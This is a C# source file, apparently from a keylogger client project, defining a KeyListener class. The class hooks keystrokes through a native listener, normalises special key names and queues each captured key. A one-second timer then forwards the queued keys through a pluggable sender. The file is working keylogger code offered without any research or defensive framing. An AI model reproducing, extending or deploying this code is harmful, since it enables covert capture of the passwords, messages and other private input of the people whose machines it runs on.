using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using NKeyLoggerLib;

namespace NKeyLoggerClient;
internal class KeyListener : IDisposable
{
    private static readonly HashSet<string> specialKeys = new HashSet<string>()
    {
        "caps lock",
        "scroll lock",
        "right shift",
        "alt",
        "ctrl",
        "tab",
        "esc",
        "shift",
        "backspace",
        "enter",
        "pause",
        "num 0",
        "num 1",
        "num 2",
        "num 3",
        "num 4",
        "num 5",
        "num 7",
        "num 8",
        "num 9",
        "num *",
        "num del",
        "f1",
        "f2",
        "f3",
        "f4",
        "f5",
        "f6",
        "f7",
        "f8",
        "f9",
        "f10",
        "f11",
        "f12",
    };
    private readonly NativeKeyListener nativeListener = new NativeKeyListener();
    private ConcurrentQueue<AbstractKeyInfo> keysQueue { get; set; } = new ConcurrentQueue<AbstractKeyInfo>();
    public ISender? sender { get; set; } = null;
    private readonly System.Timers.Timer flushTimer = new System.Timers.Timer(1000);
    private Ref<bool> isListen { get; set; } = Ref<bool>.create(false);
    private static KeyListener? instance = null;
    public static KeyListener Instance
    {
        get
        {
            if(instance == null)
                instance = new KeyListener();
            return instance;
        }
    }

    public KeyListener()
    {
        nativeListener.onKeyDown += takeKey;
        flushTimer.Elapsed += (caller, e) =>
        {
            if(sender != null)
                lock (sender)
                {
                    while (keysQueue.Count > 0)
                    {
                        AbstractKeyInfo? sendObj;
                        keysQueue.TryDequeue(out sendObj);
                        if (sendObj != null)
                        {
                            sender.Send(sendObj);
                            Log<KeyListener>.Instance.logger?.LogDebug($"KeyListener sending key information: {sendObj.ToString()}");
                        }
                    }
                }
        };
        flushTimer.Start();
    }
    ~KeyListener()
    {
        this.Dispose();
    }
    public async Task<bool> listenAsync()
    {
        lock (isListen)
        {
            if (!isListen.item)
                isListen = isListen << true;
            else
                return false;
        }
        return await nativeListener.listenAsync();
    }

    public async Task stopListenAsync()
    {
        await nativeListener.stopListenAsync();
        lock (isListen)
        {
            isListen = isListen << false;
        }
    }
    private void takeKey(AbstractKeyInfo info)
    {
        KeyInfo? keyInfo = info as KeyInfo;

        if (keyInfo is null)
            throw new ArgumentException("AbstractKeyInfo must be KeyInfo");

        lock (specialKeys)
        {
            if (specialKeys.Contains(keyInfo.Key.ToLower()))
                keyInfo.Key = keyInfo.Key.ToUpper();
        }
        keysQueue.Enqueue(info);
    }


    public void Dispose()
    {
        nativeListener.Dispose();
    }

}
